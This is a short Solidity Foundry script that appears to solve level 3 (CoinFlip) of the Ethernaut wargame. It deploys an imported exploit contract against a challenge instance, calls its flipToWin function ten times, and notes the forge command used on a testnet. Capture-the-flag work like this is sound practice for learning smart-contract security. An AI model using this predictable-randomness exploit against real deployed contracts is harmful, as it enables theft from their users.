// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/ICoinFlip.sol";
import "../src/exploits/CoinFlipExploit.sol";

contract SolveLevel3 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x90501cC20b65f603f847398740eaC4C9BE4873a9;
        value = 0;
    }

    function solveLevel(address instanceAddress) internal override {
        // I didn't manage to make this one work on anvil
        // Worked on Mumbai with command:
        // forge script script/SolveLevel3.s.sol:SolveLevel3 --rpc-url $MUMBAI_RPC_URL --broadcast -vvvv --slow --skip-simulation
        ICoinFlip instance = ICoinFlip(instanceAddress);
        CoinFlipExploit exploit = new CoinFlipExploit(instance);

        for (uint256 i = 0; i < 10; i++) {
            exploit.flipToWin();
        }
    }
}
